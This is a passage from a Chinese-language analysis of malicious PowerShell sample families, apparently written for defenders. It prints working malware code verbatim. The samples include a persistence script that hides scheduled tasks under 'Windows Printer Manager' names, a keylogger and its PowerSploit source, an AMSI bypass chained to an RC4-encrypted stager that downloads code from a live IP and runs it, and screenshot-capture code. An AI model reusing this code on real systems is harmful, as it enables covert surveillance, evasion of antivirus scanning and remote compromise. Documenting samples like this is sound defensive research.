    New-ItemProperty -path HKLM:SOFTWAREMicrosoftWindowsCurrentVersionRun -Name ScreenSpy -PropertyType String -Value "C:Windowsdynascr.exe"
    #run keylogger and screenspy
    C:Windowsdynakey.exe
    C:Windowsdynascr.exe
    #cleanup temp folder
    Remove-Item "C:WindowsTemp*"
    $loot = ($env:LOCALAPPDATA + "dyna"); md $loot
    certutil -decode res.crt ($loot + "res"); certutil -decode kl.crt ($loot + "kl.exe"); certutil -decode st.crt ($loot + "st.exe");  certutil -decode cry.crt ($loot + "cry.exe"); certutil -decode t1.crt ($env:TEMP + "t1.xml"); certutil -decode t2.crt ($env:TEMP + "t2.xml"); certutil -decode t3.crt ($env:TEMP + "t3.xml"); certutil -decode t4.crt ($env:TEMP + "t4.xml"); certutil -decode t5.crt ($env:TEMP + "t5.xml"); certutil -decode bd.crt C:ProgramDatabd.exe
    schtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager1" /XML ($env:TEMP + "t1.xml")
    schtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager2" /XML ($env:TEMP + "t2.xml")
    schtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager3" /XML ($env:TEMP + "t3.xml")
    schtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager4" /XML ($env:TEMP + "t4.xml")
    schtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager5" /XML ($env:TEMP + "t5.xml")
    schtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager1"
    schtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager2"
    schtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager3"
    schtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager4"
    schtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager5"
    Remove-Item ($env:TEMP + "*.xml") -Recurse –Force
“DynAmite KL”变种是该套件的键盘记录器组件，但其直接来源于对老版本PowerSploit的Get-Keystrokes函数的改造升级。以下是对老版本Get-Keystrokes以及“DynAmite
KL“代码的比较，从中我们可以看出后者对变量位置及类型进行了修改。
Get-Keystrokes代码：
    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
    if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
    if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
    if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
    if ($TabKey)       {$LogOutput += '[Tab]'}
    if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
    if ($DeleteKey)    {$LogOutput += '[Delete]'}
    if ($EnterKey)     {$LogOutput += '[Enter]'}
    if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
    if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
    if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
    if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
    if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
    if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
    if ($RightMouse)   {$LogOutput += '[Right Mouse]'}
DynAKey函数代码：
    $LeftShift = $ImportDll::GetAsyncKeyState(160)
    $RightShift = $ImportDll::GetAsyncKeyState(161)
    $LeftCtrl = $ImportDll::GetAsyncKeyState(162)
    $RightCtrl = $ImportDll::GetAsyncKeyState(163)
    $LeftAlt = $ImportDll::GetAsyncKeyState(164)
    $RightAlt = $ImportDll::GetAsyncKeyState(165)
    $TabKey = $ImportDll::GetAsyncKeyState(9)
    $SpaceBar = $ImportDll::GetAsyncKeyState(32)
    $DeleteKey = $ImportDll::GetAsyncKeyState(127)
    $EnterKey = $ImportDll::GetAsyncKeyState(13)
    $BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
    $LeftArrow = $ImportDll::GetAsyncKeyState(37)
    $RightArrow = $ImportDll::GetAsyncKeyState(39)
    $UpArrow = $ImportDll::GetAsyncKeyState(38)
    $DownArrow = $ImportDll::GetAsyncKeyState(34)
    $LeftMouse = $ImportDll::GetAsyncKeyState(1)
    $RightMouse = $ImportDll::GetAsyncKeyState(2)
    if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
    if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
    if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
    if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
    if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
    if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
    if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
    if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
    if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
    if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
    if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
    if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
    if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
    if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}
**（四）其他技术类别**
**4.24 AMSI Bypass（8个样本，占比0.20%）**
反恶意软件扫描接口（Antimalware Scan Interface,
AMSI）是微软在Windows10中新增的一项功能，旨在为应用程序和反病毒软件建立顺畅的通信渠道。理想情况下，应用程序（在本文中为PowerShell应用）在运行时会对从本地或远程获取到的脚本去混淆处理，通过AMSI接口传递给反病毒软件进行安全性扫描。如果反病毒软件判定脚本具有恶意性质，应用程序会阻止脚本的进一步运行。
Matt
Graeber发布了一行Twitter短文，告诉人们如何通过将“amsiInitFailed“设置为”True“来绕过AMSI机制，这种设置会让防病毒软件误以为AMSI失效从而绕过此项检查。
    [ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ&lt;@{3mjG4&amp;1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD("Cookie","session=Pu8sEnIpxIwINbUOVsxlL66DoHA=");$ser='http://35.165.38[.]15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](&amp; $R $data ($IV+$K))|IEX
以上代码与PowerShell Empire中的EncryptedScriptDropper存在类似异或处理特征，可能与之直接有关，或者参考了其中部分代码。
**4.25 PowerSploit GTS（3个样本，占比0.07%）**
此类变种直接来源于PowerSploit的Get-TimedScreenshot模块。以下代码每隔两秒抓取一次屏幕截图。
    function Get-TimedScreenshot
    {
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [ValidateScript({Test-Path -Path $_ })]
            [String] $Path,
            [Parameter(Mandatory=$True)]
            [Int32] $Interval,
            [Parameter(Mandatory=$True)]
            [String] $EndTime
        )
        Function Get-Screenshot {
           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
           $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
           $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
           $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
           $DrawingGraphics.Dispose()
           $ScreenshotObject.Save($FilePath)
           $ScreenshotObject.Dispose()
        }
        Try {
            #load required assembly
            Add-Type -Assembly System.Windows.Forms
            Do {
                #get the current time and build the filename from it
                $Time = (Get-Date)
                [String] $FileName = "$($Time.Month)"